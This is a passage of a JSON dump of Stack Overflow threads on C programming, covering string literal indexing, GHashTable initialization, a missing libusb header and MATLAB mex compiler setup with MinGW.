"https://www.gravatar.com/avatar/ddd4f75b6e9293967ba3c81f89edd68a?s=128&d=identicon&r=PG", "display_name": "Lee Daniel Crocker", "link": "https://stackoverflow.com/users/2192494/lee-daniel-crocker"}, "edited": false, "score": 3, "creation_date": 1437603351, "post_id": 31574941, "comment_id": 51104768, "body": "Completely legal, completely standard, old news."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 3, "creation_date": 1437603377, "post_id": 31574941, "comment_id": 51104788, "body": "possible duplicate of <a href=\"http://stackoverflow.com/questions/11503248/is-literal-string-indexing-standard-c\">Is literal string indexing standard C?</a>"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1437603417, "post_id": 31574941, "comment_id": 51104801, "body": "Note this is standard in many other languages,"}, {"owner": {"reputation": 1379, "user_id": 4682920, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/Ri6Av.png?s=128&g=1", "display_name": "Imobilis", "link": "https://stackoverflow.com/users/4682920/imobilis"}, "edited": false, "score": 1, "creation_date": 1437603985, "post_id": 31574941, "comment_id": 51105029, "body": "I think S/O needs improvements concerning the questions searcher."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1437604238, "post_id": 31574941, "comment_id": 51105141, "body": "No search engine can foresee the creativeness of askers on SO. It&#39;s all a matter of search phrase and memory (I had in mind there were such questions (sic! plural!)."}, {"owner": {"reputation": 1379, "user_id": 4682920, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/Ri6Av.png?s=128&g=1", "display_name": "Imobilis", "link": "https://stackoverflow.com/users/4682920/imobilis"}, "edited": false, "score": 0, "creation_date": 1437604355, "post_id": 31574941, "comment_id": 51105187, "body": "Me either. I was closely certain that there is such question already. However, I could not find it so.."}, {"owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "edited": false, "score": 1, "creation_date": 1437604888, "post_id": 31574941, "comment_id": 51105397, "body": "See also <a href=\"http://c-faq.com/aryptr/q6.11.html\" rel=\"nofollow noreferrer\">question 6.11</a> in the <a href=\"http://c-faq.com/\" rel=\"nofollow noreferrer\">C FAQ list</a>."}, {"owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "edited": false, "score": 0, "creation_date": 1437605345, "post_id": 31574941, "comment_id": 51105527, "body": "When converting to decimal or hexadecimal strings it&#39;s not uncommon to see things like <code>*p++ = &quot;0123456789&quot;[n%10]</code> or <code>*p++ = &quot;0123456789abcdef&quot;[n%16]</code>."}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 1, "creation_date": 1437606661, "post_id": 31574941, "comment_id": 51105922, "body": "@Malina Yeah the searcher is terrible. Using google with &quot;site:stackoverflow.com&quot; does better"}], "answers": [{"tags": [], "owner": {"reputation": 133646, "user_id": 1119701, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d4bef9fe12d776629b204d4e650c2e0?s=128&d=identicon&r=PG", "display_name": "ouah", "link": "https://stackoverflow.com/users/1119701/ouah"}, "is_accepted": false, "score": 1, "last_activity_date": 1437603345, "creation_date": 1437603345, "answer_id": 31574976, "question_id": 31574941, "link": "https://stackoverflow.com/questions/31574941/index-operator-bound-to-a-string-literal/31574976#31574976", "title": "Index operator bound to a string literal", "body": "<pre><code>\"Hello World\"[1]\n</code></pre>\n\n<p>is perfectly valid. A string literal is of type array of <code>N</code> characters. The type of <code>\"Hello World\"</code> is an array of 12 <code>char</code> (i.e., <code>char[12]</code>).</p>\n"}, {"tags": [], "owner": {"reputation": 96743, "user_id": 2455888, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/MQu4W.png?s=128&g=1", "display_name": "haccks", "link": "https://stackoverflow.com/users/2455888/haccks"}, "is_accepted": true, "score": 3, "last_activity_date": 1437603364, "creation_date": 1437603364, "answer_id": 31574981, "question_id": 31574941, "link": "https://stackoverflow.com/questions/31574941/index-operator-bound-to-a-string-literal/31574981#31574981", "title": "Index operator bound to a string literal", "body": "<p>This is semantically correct.  <code>\"Hello World\"[1]</code> is equivalent to <code>*(\"Hello World\" + 1)</code>. In this expression the string <code>\"Hello World\"</code> will be converted to pointer to its first element. Therefore, <code>(\"Hello World\" + 1)</code> is the address of second element of string <code>\"Hello World\"</code>.</p>\n"}], "owner": {"reputation": 1379, "user_id": 4682920, "user_type": "registered", "accept_rate": 71, "profile_image": "https://i.stack.imgur.com/Ri6Av.png?s=128&g=1", "display_name": "Imobilis", "link": "https://stackoverflow.com/users/4682920/imobilis"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 67, "favorite_count": 0, "accepted_answer_id": 31574981, "answer_count": 2, "score": -1, "last_activity_date": 1437603567, "creation_date": 1437603193, "last_edit_date": 1437603419, "question_id": 31574941, "link": "https://stackoverflow.com/questions/31574941/index-operator-bound-to-a-string-literal", "title": "Index operator bound to a string literal", "body": "<p>So I decided to experiment, completely out of randomness.\nAnd I found this:</p>\n\n<pre><code>\"Hello World\"[1]\n</code></pre>\n\n<p>Actually working on a first view, resulting in <code>'e'</code>\neven though:</p>\n\n<ul>\n<li>I haven't encounter this anywhere until happened to be in my code</li>\n<li>Seems semantically controversial (or at least quite suspicious)</li>\n<li>Could not find any information on the internet, regarding this positive string literal array indexing (probably searching in the wrong context?)\n\n<hr></li>\n</ul>\n\n<p>Is this actually allowed, confronting the \"standards\" with guaranteed well-defined behavior ?</p>\n"}, {"tags": ["c", "hashtable", "glib"], "comments": [{"owner": {"reputation": 26033, "user_id": 1047662, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/8aXzf.jpg?s=128&g=1", "display_name": "Cyclonecode", "link": "https://stackoverflow.com/users/1047662/cyclonecode"}, "edited": false, "score": 0, "creation_date": 1437601879, "post_id": 31574578, "comment_id": 51104139, "body": "You could simply do <code>memset(hash_table-&gt;keys, 0, sizeof(gpointer) * hash_table-&gt;size);</code>"}], "answers": [{"comments": [{"owner": {"reputation": 119, "user_id": 1323328, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/7051184728f0cf2ed56e5418fd4f5bc7?s=128&d=identicon&r=PG", "display_name": "user1323328", "link": "https://stackoverflow.com/users/1323328/user1323328"}, "edited": false, "score": 0, "creation_date": 1437607919, "post_id": 31575291, "comment_id": 51106234, "body": "Thank you. Your answer helps a lot!"}, {"owner": {"reputation": 7536, "user_id": 771066, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6d207f95c530f2b59f763d7b699f6d81?s=128&d=identicon&r=PG", "display_name": "ebassi", "link": "https://stackoverflow.com/users/771066/ebassi"}, "edited": false, "score": 0, "creation_date": 1438623728, "post_id": 31575291, "comment_id": 51515022, "body": "This answer is patently wrong, and should be ignored. You <i>must</i> use the provided initializers for GLib data structures: just allocating the structure with malloc() will not work."}], "tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 0, "last_activity_date": 1437604922, "last_edit_date": 1495540283, "creation_date": 1437604922, "answer_id": 31575291, "question_id": 31574578, "link": "https://stackoverflow.com/questions/31574578/initialize-the-struct-ghashtable-in-c/31575291#31575291", "title": "Initialize the struct GHashTable in C", "body": "<p>From the man page for <code>malloc()</code>:</p>\n\n<blockquote>\n  <p>malloc() allocates size bytes and returns a pointer to the allocated\n  memory.  The memory is not  cleared.</p>\n</blockquote>\n\n<p>So memory allocated for your structure as well as your arrays are uninitialized.  They could be zero or any other value.</p>\n\n<p>If you want allocated memory to be zero'ed out, you need to use <code>memset</code> to do so:</p>\n\n<pre><code>hash_table = malloc(sizeof(GHashTable));\nmemset(hash_table, 0, sizeof(*hash_table));\n</code></pre>\n\n<p>In the case of your arrays, you can use <code>calloc</code> to do so, which also has the side effect of zeroing out the allocated memory:</p>\n\n<pre><code>hash_table-&gt;keys = calloc(hash_table-&gt;size, sizeof(gpointer));\nhash_table-&gt;values = hash_table-&gt;keys;\nhash_table-&gt;hashes = calloc(hash_table-&gt;size, sizeof(guint));\n</code></pre>\n\n<p>Also note that the return value of the <code>malloc</code> family of functions should NOT be type-casted in C.  Doing so can hide errors in your code, such as a failure to <code>#include &lt;stdlib.h&gt;</code>  Take a look at <a href=\"https://stackoverflow.com/questions/605845/do-i-cast-the-result-of-malloc/605858#605858\">this question</a> for more details.</p>\n"}, {"tags": [], "owner": {"reputation": 13984, "user_id": 501126, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/839de8a602b21abf36e020bcb32959fe?s=128&d=identicon&r=PG", "display_name": "nemequ", "link": "https://stackoverflow.com/users/501126/nemequ"}, "is_accepted": false, "score": 5, "last_activity_date": 1437620609, "creation_date": 1437620609, "answer_id": 31577485, "question_id": 31574578, "link": "https://stackoverflow.com/questions/31574578/initialize-the-struct-ghashtable-in-c/31577485#31577485", "title": "Initialize the struct GHashTable in C", "body": "<p>You should not be initializing a <code>GHashTable</code> yourself.  The <code>GHashTable</code> structure is incomplete in the public headers and is private API.  It can change without notice.  You should be calling <a href=\"https://developer.gnome.org/glib/stable/glib-Hash-Tables.html#g-hash-table-new\"><code>g_hash_table_new</code></a> (or <a href=\"https://developer.gnome.org/glib/stable/glib-Hash-Tables.html#g-hash-table-new-full\"><code>g_hash_table_new_full</code></a>), which will allocate memory and properly initialize the hash table.</p>\n"}], "owner": {"reputation": 119, "user_id": 1323328, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/7051184728f0cf2ed56e5418fd4f5bc7?s=128&d=identicon&r=PG", "display_name": "user1323328", "link": "https://stackoverflow.com/users/1323328/user1323328"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 683, "favorite_count": 0, "accepted_answer_id": 31575291, "answer_count": 2, "score": 0, "last_activity_date": 1437620609, "creation_date": 1437601642, "last_edit_date": 1437601749, "question_id": 31574578, "link": "https://stackoverflow.com/questions/31574578/initialize-the-struct-ghashtable-in-c", "title": "Initialize the struct GHashTable in C", "body": "<p>My issue related to GLib, C programming.\nWhen I initialize the struct GHashtable.</p>\n\n<pre><code>struct _GHashTable\n{\ngint             size;\ngint             mod;\nguint            mask;\ngint             nnodes;\ngint             noccupied;  /* nnodes + tombstones */\n\ngpointer        *keys;\nguint           *hashes;\ngpointer        *values;\n\nGHashFunc        hash_func;\nGEqualFunc       key_equal_func;\ngint             ref_count;\nGDestroyNotify   key_destroy_func;\nGDestroyNotify   value_destroy_func;\n</code></pre>\n\n<p>};</p>\n\n<pre><code>GHashTable *hash_table;\nhash_table = (GHashTable *)malloc(sizeof(GHashTable));\n</code></pre>\n\n<p>Inside my hash_table, I have three arrays to store the keys, values, and hashes.</p>\n\n<pre><code>gpointer        *keys;\nguint           *hashes;\ngpointer        *values;\n</code></pre>\n\n<p>I initialize those arrays in the initialization function:</p>\n\n<pre><code>hash_table-&gt;keys = malloc(sizeof(gpointer) * hash_table-&gt;size);\nhash_table-&gt;values             = hash_table-&gt;keys;\nhash_table-&gt;hashes = malloc(sizeof(guint) * hash_table-&gt;size);\n</code></pre>\n\n<p>My question is when I display the hash_tables after I allocate memory, I found there is a number stored in the values array.</p>\n\n<pre><code>[0] key: (null) hash: 0 values: (null)\n[1] key: (null) hash: 0 values: (null)\n// Where is the 64273 comes from? Why other array are \n// initialized as 0 or null. Only this index is initialized like that?\n[2] key: (null) hash: 64273 values: (null)\n[3] key: (null) hash: 0 values: (null)\n[4] key: (null) hash: 0 values: (null)\n[5] key: (null) hash: 0 values: (null)\n[6] key: (null) hash: 0 values: (null)\n[7] key: (null) hash: 0 values: (null)\n</code></pre>\n\n<p>Do I have to initialize the keys, values and hashes array manually, assigning the values as 0 or NULL after allocating the memory for them?</p>\n\n<p>Without assigning them as 0 or NULL, some random numbers or garbage numbers will come out like that?</p>\n\n<p>Thank you.</p>\n"}, {"tags": ["c"], "answers": [{"tags": [], "owner": {"reputation": 2915, "user_id": 5136580, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/42efea573d72921a6de90bef052c4879?s=128&d=identicon&r=PG&f=1", "display_name": "Mikel Rychliski", "link": "https://stackoverflow.com/users/5136580/mikel-rychliski"}, "is_accepted": false, "score": 3, "last_activity_date": 1437601682, "creation_date": 1437601682, "answer_id": 31574588, "question_id": 31574542, "link": "https://stackoverflow.com/questions/31574542/no-such-file-or-directory-usb-h/31574588#31574588", "title": "No Such File or Directory &lt;usb.h&gt;", "body": "<p>You need the full <code>libusb-dev</code> package to compile programs using libusb, as opposed to the <code>libusb</code> package which just lets you run them</p>\n"}, {"tags": [], "owner": {"reputation": 608, "user_id": 1828193, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/22c498903307d42a9cb2b7142f6b73f2?s=128&d=identicon&r=PG", "display_name": "Pepedou", "link": "https://stackoverflow.com/users/1828193/pepedou"}, "is_accepted": false, "score": 1, "last_activity_date": 1437607253, "creation_date": 1437607253, "answer_id": 31575653, "question_id": 31574542, "link": "https://stackoverflow.com/questions/31574542/no-such-file-or-directory-usb-h/31575653#31575653", "title": "No Such File or Directory &lt;usb.h&gt;", "body": "<p>Open a terminal and run <code>sudo apt-get install libusb-dev</code> (at least in Ubuntu).</p>\n"}, {"tags": [], "owner": {"reputation": 1080, "user_id": 6747994, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5b96a31e4a4e7187f599467e7eee70ae?s=128&d=identicon&r=PG", "display_name": "JoKalliauer", "link": "https://stackoverflow.com/users/6747994/jokalliauer"}, "is_accepted": false, "score": 1, "last_activity_date": 1604574235, "creation_date": 1604574235, "answer_id": 64695874, "question_id": 31574542, "link": "https://stackoverflow.com/questions/31574542/no-such-file-or-directory-usb-h/64695874#64695874", "title": "No Such File or Directory &lt;usb.h&gt;", "body": "<p>Ubuntu: <code>sudo apt-get install libusb-dev</code></p>\n<p>Fedora: <code>sudo dnf install libusb-devel</code></p>\n"}], "owner": {"reputation": 27, "user_id": 5133306, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-96FYMPxWaPY/AAAAAAAAAAI/AAAAAAAAAF0/BBZld4FdpU4/photo.jpg?sz=128", "display_name": "Ender Graphix", "link": "https://stackoverflow.com/users/5133306/ender-graphix"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 3695, "favorite_count": 0, "answer_count": 3, "score": 1, "last_activity_date": 1604574235, "creation_date": 1437601517, "question_id": 31574542, "link": "https://stackoverflow.com/questions/31574542/no-such-file-or-directory-usb-h", "title": "No Such File or Directory &lt;usb.h&gt;", "body": "<p>I tried to run a program for my k70 rgb : <a href=\"https://github.com/CalcProgrammer1/CorsairKeyboardSpectrograph/blob/c8e2605e42e77c013857ccee58edd8a3fe998f3d/README.md\" rel=\"nofollow\">https://github.com/CalcProgrammer1/CorsairKeyboardSpectrograph/blob/c8e2605e42e77c013857ccee58edd8a3fe998f3d/README.md</a> on CodeBlocks. When it included usb.h, it said Nos uch file or directory, so I installed libusb, but still the same problem...</p>\n"}, {"tags": ["c", "matlab", "gcc", "mex"], "comments": [{"owner": {"reputation": 260120, "user_id": 103167, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/rX1ss.png?s=128&g=1", "display_name": "Ben Voigt", "link": "https://stackoverflow.com/users/103167/ben-voigt"}, "edited": false, "score": 0, "creation_date": 1437602820, "post_id": 31574260, "comment_id": 51104538, "body": "<code>-m32</code> may have avoided an error, but it did not solve your problem.  You <b>need</b> <code>-m64</code> to compile a MEX to load in 64-bit Matlab.  Get a gcc with 64-bit mode enabled, or else use Visual Studio.  You need a link for VS2010 Express Edition?  See <a href=\"http://stackoverflow.com/questions/3061811/how-to-get-download-link-to-vs2010-express-for-use-in-a-download-manager\" title=\"how to get download link to vs2010 express for use in a download manager\">stackoverflow.com/questions/3061811/&hellip;</a>"}, {"owner": {"reputation": 260120, "user_id": 103167, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/rX1ss.png?s=128&g=1", "display_name": "Ben Voigt", "link": "https://stackoverflow.com/users/103167/ben-voigt"}, "edited": false, "score": 0, "creation_date": 1437602998, "post_id": 31574260, "comment_id": 51104617, "body": "Or ask a question about getting <code>mex -setup</code> to work with VS 2015.  Since it was just released, it&#39;s a great time for such a question, and there&#39;s <a href=\"http://stackoverflow.com/a/22567960/103167\">a history of having to rewrite mex configuration whenever a new compiler is released</a>, so it will be well-received."}, {"owner": {"reputation": 29526, "user_id": 2778484, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/tzgZz.png?s=128&g=1", "display_name": "chappjc", "link": "https://stackoverflow.com/users/2778484/chappjc"}, "edited": false, "score": 0, "creation_date": 1437603599, "post_id": 31574260, "comment_id": 51104869, "body": "Since you are looking at that thread to setup GCC, scroll down and follow <a href=\"http://stackoverflow.com/a/28490382/2778484\">this</a> answer instead.  It was added years after the others and (IMHO) is the most current and easiest way -- It&#39;s not just an answer, <i>it&#39;s what I do</i>.  You just need R2014a or newer."}, {"owner": {"reputation": 29526, "user_id": 2778484, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/tzgZz.png?s=128&g=1", "display_name": "chappjc", "link": "https://stackoverflow.com/users/2778484/chappjc"}, "edited": false, "score": 0, "creation_date": 1437603925, "post_id": 31574260, "comment_id": 51105008, "body": "That said, have you tried installing the native 64-bit mingw cygwin packages called mingw64-x86_64-* (you probably need to call x86_64-w64-mingw32-gcc.exe)?"}, {"owner": {"reputation": 3868, "user_id": 2386026, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b480a437c4c0af43ae3866177c79e142?s=128&d=identicon&r=PG&f=1", "display_name": "Jens Munk", "link": "https://stackoverflow.com/users/2386026/jens-munk"}, "edited": false, "score": 0, "creation_date": 1437605694, "post_id": 31574260, "comment_id": 51105650, "body": "You could also install 64-bit cygwin"}, {"owner": {"reputation": 29526, "user_id": 2778484, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/tzgZz.png?s=128&g=1", "display_name": "chappjc", "link": "https://stackoverflow.com/users/2778484/chappjc"}, "reply_to_user": {"reputation": 3868, "user_id": 2386026, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/b480a437c4c0af43ae3866177c79e142?s=128&d=identicon&r=PG&f=1", "display_name": "Jens Munk", "link": "https://stackoverflow.com/users/2386026/jens-munk"}, "edited": false, "score": 0, "creation_date": 1437608587, "post_id": 31574260, "comment_id": 51106401, "body": "@JensMunk I&#39;m assuming he did.  Even so, you still have to select the mingw64 packages that target 64-bit systems.  The compiler he is calling (starting with i686-) targets 32-bit and that is also available on &quot;64-bit cygwin&quot;."}, {"owner": {"reputation": 4766, "user_id": 2316667, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/919384c541aa0e81ea78cd33f1c40cba?s=128&d=identicon&r=PG", "display_name": "user2316667", "link": "https://stackoverflow.com/users/2316667/user2316667"}, "reply_to_user": {"reputation": 260120, "user_id": 103167, "user_type": "registered", "accept_rate": 53, "profile_image": "https://i.stack.imgur.com/rX1ss.png?s=128&g=1", "display_name": "Ben Voigt", "link": "https://stackoverflow.com/users/103167/ben-voigt"}, "edited": false, "score": 0, "creation_date": 1437665177, "post_id": 31574260, "comment_id": 51135390, "body": "@Ben Voigt That&#39;s true, but people probably want to configure VS2015 for newer versions of matlab. Still, if you think it&#39;s still worth asking for R2011a let me know. Also, I appreciate the link and I updated my question with the result of installing Visual C++ (the link was not for visual studio -- apparently)"}, {"owner": {"reputation": 29526, "user_id": 2778484, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/tzgZz.png?s=128&g=1", "display_name": "chappjc", "link": "https://stackoverflow.com/users/2778484/chappjc"}, "edited": false, "score": 0, "creation_date": 1437668340, "post_id": 31574260, "comment_id": 51137680, "body": "Regarding the VS2010 express + SDK 7.1 problem, get all the available updates and patches, then look at this known problem:  <a href=\"http://stackoverflow.com/a/19105762/2778484\">stackoverflow.com/a/19105762/2778484</a>"}], "answers": [{"comments": [{"owner": {"reputation": 4766, "user_id": 2316667, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/919384c541aa0e81ea78cd33f1c40cba?s=128&d=identicon&r=PG", "display_name": "user2316667", "link": "https://stackoverflow.com/users/2316667/user2316667"}, "edited": false, "score": 0, "creation_date": 1437665329, "post_id": 31575262, "comment_id": 51135504, "body": "I really appreciate it, I didn&#39;t know this. I updated my question with a new error with new compiler that targets 64 bit systems."}, {"owner": {"reputation": 29526, "user_id": 2778484, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/tzgZz.png?s=128&g=1", "display_name": "chappjc", "link": "https://stackoverflow.com/users/2778484/chappjc"}, "reply_to_user": {"reputation": 4766, "user_id": 2316667, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/919384c541aa0e81ea78cd33f1c40cba?s=128&d=identicon&r=PG", "display_name": "user2316667", "link": "https://stackoverflow.com/users/2316667/user2316667"}, "edited": false, "score": 0, "creation_date": 1437667863, "post_id": 31575262, "comment_id": 51137355, "body": "@user2316667 Sadly, I don&#39;t have time to try this out, but I think you need to add some switches to the compiler flags.  Add these: <code>-m64 -mwin32 -mdll </code>.  And yes, you do need <code>-shared</code> as a linker flag. See the flags in the <a href=\"https://github.com/chappjc/MATLAB/blob/master/MinGW/mex_C%2B%2B_mingw-w64.xml\" rel=\"nofollow noreferrer\">xml configuration file</a> I&#39;ve made for newer MATLAB versions.  Another option is to try use the <a href=\"http://sourceforge.net/projects/mingw-w64/files/Toolchains%20targetting%20Win64/Personal%20Builds/mingw-builds/4.9.2/threads-posix/seh/\" rel=\"nofollow noreferrer\">standalone mingw64</a> (non-cygwin)."}], "tags": [], "owner": {"reputation": 29526, "user_id": 2778484, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/tzgZz.png?s=128&g=1", "display_name": "chappjc", "link": "https://stackoverflow.com/users/2778484/chappjc"}, "is_accepted": true, "score": 1, "last_activity_date": 1437668116, "last_edit_date": 1437668116, "creation_date": 1437604768, "answer_id": 31575262, "question_id": 31574260, "link": "https://stackoverflow.com/questions/31574260/how-to-configure-mex-for-matlab-2011-with-mingw/31575262#31575262", "title": "How to configure mex for MATLAB 2011 with MinGW", "body": "<p>Despite having \"w64\" in the file name, <code>i686-w64-mingw32-gcc.exe</code> generates 32-bit binaries.</p>\n\n<p>To generate 64-bit binaries, use <code>x86_64-w64-mingw32-gcc.exe</code>.  In the cygwin package installer, look for mingw64-x86_64-.</p>\n\n<p>\"mingw64\" GCC toolchains in the list below.  The first targets 32-bit systems and the second 64-bit.  They are named this way because they are from the \"GCC for Win64\" project (cygwin is <a href=\"http://mingw-w64.org/doku.php/download\" rel=\"nofollow noreferrer\">not the only source</a> for these toolchains).  Also get the C toolchains (not shown below).</p>\n\n<p><a href=\"https://i.stack.imgur.com/U8JfQ.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/U8JfQ.png\" alt=\"enter image description here\"></a></p>\n\n<p>Also, based on my experience with the <a href=\"http://sourceforge.net/projects/mingw-w64/files/Toolchains%20targetting%20Win64/Personal%20Builds/mingw-builds/5.1.0/\" rel=\"nofollow noreferrer\">standalone mingw64</a>, you probably need to add the following compiler flags to what you have:</p>\n\n<pre><code>-m64 -mwin32 -mdll ...\n</code></pre>\n\n<p>And you do need <code>-shared</code> as a linker flag.</p>\n"}], "owner": {"reputation": 4766, "user_id": 2316667, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/919384c541aa0e81ea78cd33f1c40cba?s=128&d=identicon&r=PG", "display_name": "user2316667", "link": "https://stackoverflow.com/users/2316667/user2316667"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 672, "favorite_count": 0, "accepted_answer_id": 31575262, "answer_count": 1, "score": 1, "last_activity_date": 1437668116, "creation_date": 1437600306, "last_edit_date": 1495542587, "question_id": 31574260, "link": "https://stackoverflow.com/questions/31574260/how-to-configure-mex-for-matlab-2011-with-mingw", "title": "How to configure mex for MATLAB 2011 with MinGW", "body": "<p>I'm running 64 bit windows and 64 bit matlab. Following the instructions of an answer to a <a href=\"https://stackoverflow.com/questions/8552580/using-gcc-mingw-as-matlabs-mex-compiler\">question on stackoverflow</a>, I tried to configure a make file to compile my C function for use in matlab.</p>\n\n<p>Here is the Makefile file:</p>\n\n<pre><code>MINGWPATH=/cygdrive/c/cygwin\nCYGPATH=/cygdrive/c/cygwin\n\nMATLABROOT=/cygdrive/c/Progra~1/MATLAB/R2011a\nCC=i686-pc-mingw32-gcc\nCFLAG= -Wall -m32 -O3 -Iinclude -I$(MATLABROOT)/extern/include $(SRC) $(LIBS) -o $(EXE)\nMEXFLAG=-m64 -shared -DMATLAB_MEX_FILE -I$(MATLABROOT)/extern/include -Wl,--export-all-symbols $(LIBS) $(MEXSRC) -o $(MEXTGT).mexw64\n\nLIBS= -Llib -L$(MATLABROOT)/bin/win64 -L$(MATLABROOT)/extern/lib/win64/microsoft -lmex -lmx -lmwlapack -lmwblas -leng\nEXE= gopenfunction.exe\nMEXTGT= gopenfunction.m\nSRC= gopenfunction.c\nMEXSRC = gopenfunction.c\n\nall:$(EXE)\n\n$(EXE):  $(SRC)\n    $(CC) $(CFLAG) -ladvapi32 -luser32 -lgdi32 -lkernel32 -lmingwex -o $(EXE)\n</code></pre>\n\n<p>Output</p>\n\n<pre><code>$ make\ni686-w64-mingw32-gcc -Wall -m32 -O3 -Iinclude -I/cygdrive/c/Progra~1/MATLAB/R2011a/extern/include gopenfunction.c -Llib -L/cygdrive/c/Progra~1/MATLAB/R2011a/bin/win64 -L/cygdrive/c/Progra~1/MATLAB/R2011a/extern/lib/win64/microsoft -lmex -lmx -lmwlapack -lmwblas -leng -o gopenfunction.exe -ladvapi32 -luser32 -lgdi32 -lkernel32 -lmingwex -o gopenfunction.exe\n/cygdrive/c/Progra~1/MATLAB/R2011a/bin/win64/libmex.dll: file not recognized: File format not recognized\ncollect2: error: ld returned 1 exit status\nMakefile:18: recipe for target 'gopenfunction.exe' failed\nmake: *** [gopenfunction.exe] Error 1\n</code></pre>\n\n<p>I also tried:</p>\n\n<pre><code>i686-w64-mingw32-gcc -m32 -shared -Iinclude -I\"/cygdrive/c/Progra~1/MATLAB/R2011a/extern/include\" -DMATLAB_MEX_FILE -o bla.mexw64 -Wl,--export-all-symbols *.c -L\"/cygdrive/c/Progra~1/MATLAB/R2011a/bin/win64\" -lmex -lmx -leng -lmat\n</code></pre>\n\n<p>I am using GCC because I cannot find VS2008 or 2010, only VS Community 2015 which doesn't work when I try to setup with mex via <code>mex -setup</code></p>\n\n<p>Note that I changed from -m64 to -m32 because otherwise I received the error below. I'm not entirely sure what it does.</p>\n\n<pre><code>$ i686-w64-mingw32-gcc -m64 -shared -Iinclude -I\"/cygdrive/c/Progra~1/MATLAB/R2011a/extern/include\" -DMATLAB_MEX_FILE -o bla.mexw64 -Wl,--export-all-symbols *.c -L\"/cygdrive/c/Progra~1/MATLAB/R2011a/bin/win64\" -lmex -lmx -leng -lmat\ngopenfunction.c:1:0: sorry, unimplemented: 64-bit mode not compiled in\n #include \"gclibo.h\"\n</code></pre>\n\n<h1>Visual Studio Follow-Up</h1>\n\n<p>After installing Microsoft Visual C++ the compiler option popped up but requires the SDK. Attempting to install the <a href=\"https://www.microsoft.com/en-ca/download/confirmation.aspx?id=2680\" rel=\"nofollow noreferrer\">sdk</a> results in an error 'visual studio 2010 must be installed.' I also installed .NET 4 and <a href=\"http://www.microsoft.com/en-us/download/details.aspx?id=8279\" rel=\"nofollow noreferrer\">SDK for Windows 7</a> as per the <a href=\"http://www.mathworks.com/support/compilers/R2011a/win64.html\" rel=\"nofollow noreferrer\">supported compilers for MATLAB 2011 page</a>.</p>\n\n<pre><code>&gt;&gt; mex -setup\n\nWelcome to mex -setup.  This utility will help you set up  \na default compiler.  For a list of supported compilers, see  \nhttp://www.mathworks.com/support/compilers/R2011a/win64.html \n\nPlease choose your compiler for building MEX-files: \n\nWould you like mex to locate installed compilers [y]/n? y\n\nSelect a compiler: \n[1] 